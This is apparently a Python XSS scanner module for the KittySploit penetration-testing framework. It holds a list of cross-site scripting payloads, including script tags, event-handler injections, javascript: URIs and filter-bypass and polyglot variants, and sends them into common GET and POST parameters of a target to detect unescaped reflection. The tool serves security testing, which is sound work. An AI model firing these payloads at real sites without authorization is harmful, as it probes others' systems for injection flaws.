#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import re
import urllib.parse
import html


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'XSS Scanner',
        'description': 'Scans for Cross-Site Scripting (XSS) vulnerabilities including reflected, stored, and DOM-based XSS',
        'author': 'KittySploit Team',
        'tags': ['web', 'xss', 'scanner', 'security', 'injection'],
        'references': [
            'https://owasp.org/www-community/attacks/xss/',
            'https://portswigger.net/web-security/cross-site-scripting',
            'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
        ]
    }

    # XSS payloads
    XSS_PAYLOADS = [
        # Basic XSS
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        '<script>alert(\'XSS\')</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        
        # Event handlers
        '<img src=x onerror="alert(1)">',
        '<img src=x onerror=\'alert(1)\'>',
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        '<svg/onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        
        # JavaScript protocol
        'javascript:alert(1)',
        'javascript:alert("XSS")',
        'javascript:alert(\'XSS\')',
        'javascript:alert(String.fromCharCode(88,83,83))',
        
        # Encoded payloads
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        
        # Bypass filters
        '<img src=x onerror=alert`1`>',
        '<img src=x onerror=alert(1)//',
        '<img src=x onerror="alert(1)">',
        '<img src=x onerror=\'alert(1)\'>',
        '<img src=x onerror=alert&lpar;1&rpar;>',
        '<img src=x onerror=alert&#40;1&#41;>',
        
        # Polyglot payloads
        '"><img src=x onerror=alert(1)>',
        '\'><img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
        
        # DOM-based XSS
        '#<img src=x onerror=alert(1)>',
        '?test=<img src=x onerror=alert(1)>',
        '?test=javascript:alert(1)',
        
        # HTML5 entities
        '<svg/onload=alert(1)>',
        '<svg><animatetransform onbegin=alert(1)>',
        
        # CSS injection (if reflected in style)
        '<style>@import\'javascript:alert("XSS")\';</style>',
        '<link rel=stylesheet href=javascript:alert(1)>',
    ]

    # Parameter names commonly used
    COMMON_PARAMS = [
        'q', 'query', 'search', 'filter', 'sort', 'order',
        'name', 'value', 'id', 'key', 'data', 'input',
        'message', 'comment', 'title', 'description',
        'user', 'username', 'email', 'content', 'text',
        'url', 'uri', 'link', 'redirect', 'return',
    ]

    def check(self):
        """
        Check if the target is accessible
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response and response.status_code in [200, 301, 302, 403, 404, 401]:
                return True
            return False
        except Exception as e:
            return False

    def _format_request_url(self, path: str) -> str:
        """Absolute URL for console output (works when thread output hides print_info)."""
        try:
            def _gv(opt):
                if hasattr(opt, "value"):
                    return opt.value
                return opt

            target = _gv(self.target)
            port = int(_gv(self.port))
            protocol = "http"
            if hasattr(self, "ssl"):
                protocol = "https" if self._to_bool(_gv(self.ssl)) else "http"
            elif port == 443:
                protocol = "https"
            p = path if str(path).startswith("/") else f"/{path}"
            return f"{protocol}://{target}:{port}{p}"
        except Exception:
            return str(path or "/")

    def test_xss_payload(self, payload, param_name='q', method='GET'):
        """
        Test an XSS payload
        
        Args:
            payload: The XSS payload to test
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            encoded_payload = urllib.parse.quote(payload, safe="")
            encoded_plus = urllib.parse.quote_plus(payload)
            test_path = "/"
            if method == 'GET':
                test_path = f"/?{param_name}={encoded_payload}"
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
            else:
                post_data = {param_name: payload}
                test_path = "/"
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            text = response.text or ""
            is_vulnerable = False
            indicators = []
            xss_type = None
            
            # Reflection: only flag when the probe string appears in the response (avoids FP from static <script> on every page).
            is_reflected = (
                payload in text
                or encoded_payload in text
                or encoded_plus in text
            )
            html_encoded = html.escape(payload)
            is_html_encoded = html_encoded in text
            
            js_indicators = ['<script', 'javascript:', 'onerror=', 'onload=', 'alert(']
            has_js_indicators = any(indicator in text.lower() for indicator in js_indicators)
            event_handlers = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus']
            has_event_handlers = any(handler in text.lower() for handler in event_handlers)
            
            if is_reflected and not is_html_encoded:
                is_vulnerable = True
                if has_js_indicators or has_event_handlers:
                    xss_type = 'Reflected XSS'
                else:
                    xss_type = 'Potential Reflected XSS'
                indicators.append('Payload reflected in response (not HTML-escaped)')
            elif is_reflected and is_html_encoded:
                indicators.append('Payload reflected but HTML-escaped (lower risk)')
            
            base = self._format_request_url("/")
            if method == "GET":
                request_url = self._format_request_url(test_path)
            else:
                pl_show = payload.replace("\n", "\\n")[:80]
                request_url = f"{base} [POST {param_name}={pl_show!r}]"
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'request_path': test_path,
                'request_url': request_url,
                'vulnerable': is_vulnerable,
                'xss_type': xss_type,
                'is_reflected': is_reflected,
                'is_html_encoded': is_html_encoded,
                'has_js_indicators': has_js_indicators,
                'has_event_handlers': has_event_handlers,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_length': len(text)
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the XSS scan
        """
        self.vulnerabilities = []
        self.test_results = []
        
        print_status("Starting XSS scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Test GET parameters
        print_status("Testing GET parameters for XSS vulnerabilities...")
        print_info("")
        
        xss_print_keys = set()
        xss_live_cap = 48
        xss_live_printed = 0
        
        for param in self.COMMON_PARAMS:
            print_info(f"Testing parameter: {param}")
            
            for i, payload in enumerate(self.XSS_PAYLOADS[:15], 1):  # Test first 15 payloads per param
                result = self.test_xss_payload(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    self.vulnerabilities.append(result)
                    key = ("GET", param)
                    if key in xss_print_keys or xss_live_printed >= xss_live_cap:
                        continue
                    xss_print_keys.add(key)
                    xss_live_printed += 1
                    pl_show = payload if len(payload) <= 100 else (payload[:97] + "…")
                    print_success(
                        f"[!] Potential XSS | GET {result.get('request_url', '')} "
                        f"| param={param} | {result.get('xss_type', 'Unknown')} "
                        f"| payload={pl_show!r}"
                    )
        
        print_info("")
        
        # Test POST parameters
        print_status("Testing POST parameters for XSS vulnerabilities...")
        print_info("")
        
        for param in self.COMMON_PARAMS[:10]:  # Test first 10 params via POST
            print_info(f"Testing POST parameter: {param}")
            
            for payload in self.XSS_PAYLOADS[:10]:  # Test first 10 payloads
                result = self.test_xss_payload(payload, param, method='POST')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    self.vulnerabilities.append(result)
                    key = ("POST", param)
                    if key in xss_print_keys or xss_live_printed >= xss_live_cap:
                        continue
                    xss_print_keys.add(key)
                    xss_live_printed += 1
                    pl_show = payload if len(payload) <= 100 else (payload[:97] + "…")
                    print_success(
                        f"[!] Potential XSS | POST {result.get('request_url', '')} "
                        f"| param={param} | {result.get('xss_type', 'Unknown')} "
                        f"| payload={pl_show!r}"
                    )
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("XSS Scan Summary")
        print_status("=" * 60)
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_warning("XSS vulnerabilities detected:")
            print_info("")
            
            # Group by XSS type
            by_type = {}
            for vuln in self.vulnerabilities:
                xss_type = vuln.get('xss_type', 'Unknown')
                if xss_type not in by_type:
                    by_type[xss_type] = []
                by_type[xss_type].append(vuln)
            
            for xss_type, vulns in by_type.items():
                print_info(f"{xss_type} ({len(vulns)} found):")
                table_data = []
                for vuln in vulns[:10]:  # Show first 10 per type
                    payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                    indicators = ', '.join(vuln.get('indicators', [])[:1])
                    req = str(vuln.get('request_url') or '')[:96]
                    table_data.append([
                        vuln.get('param', 'N/A'),
                        vuln.get('method', 'GET'),
                        req,
                        payload_short,
                        indicators
                    ])
                
                if table_data:
                    print_table(['Parameter', 'Method', 'URL', 'Payload', 'Indicators'], table_data)
                print_info("")
            
            print_warning("IMPORTANT: These are potential XSS vulnerabilities. Manual verification in a browser is required.")
        else:
            print_info("No XSS vulnerabilities detected during automated testing.")
            print_info("Note: This does not guarantee the application is secure.")
        
        return True
